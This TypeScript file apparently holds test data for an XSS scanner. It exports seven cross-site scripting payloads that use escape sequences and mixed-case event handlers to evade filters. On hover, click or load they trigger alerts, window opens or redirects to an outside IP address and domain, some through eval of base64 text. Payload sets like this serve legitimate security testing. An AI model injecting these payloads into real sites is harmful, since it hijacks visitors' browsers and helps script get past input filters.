import { XssPayloadsInterface } from "@customTypes/interface";

const XSSTEST = `XSS TEST`;

export const xssPayloads: XssPayloadsInterface[] = [
  {
    payload: `<p onpoinTerOver=location=\`\u0068tt\x70s\x3a\x2f/211.236.179.244\`>${XSSTEST}</p>`,
    description:
      "When pointer hovers on <p> tag, it'll trigger location function",
  },
  {
    payload: `<img src=x onPointerOver=\u0077indow.\u006fpen\`htt\x70\u003a//www.cyberone.kr\`>`,
    description: `When hovered pointer hovers on <img> tag, it'll trigger window open`,
  },
  {
    payload: `<a href="javascript:alert\`xss\`">${XSSTEST}</a>`,
    description: `When you click <a> tag, it'll trigger alert function`,
  },
  {
    payload: `<h1 onpOInterleAVE=\u006cocation=\`\u0068tt\x70\x3a\x2f/211.236.179.244\`>${XSSTEST}</h1>`,
    description: `When hovered pointer leaves <h1> tag, it'll trigger location function`,
  },
  {
    payload: `<img src=z onPoinTerOVeR=\u0065val(\u0061tob\`YWxlcnQoImFsZXJ0Iik7\`);>`,
    description: `When pointer hovers on <img> tag, it'll trigger location function`,
  },
  {
    payload: `<META HTTP-EQUIV="refresh" CONTENT="2;url=http://www.cyberone.kr"]`,
    description: `It will redirect to target page automatically - Change ] to >(for preventing url redirect)`,
  },
  {
    payload: `<h3 onPOINterLeavE=\u0065val(\u0061tob\`YWxlcnQoImFsZXJ0Iik7\`)>${XSSTEST}</h3>`,
    description: `When pointer leaves <h3> tag, it'll trigger alert function`,
  },
];
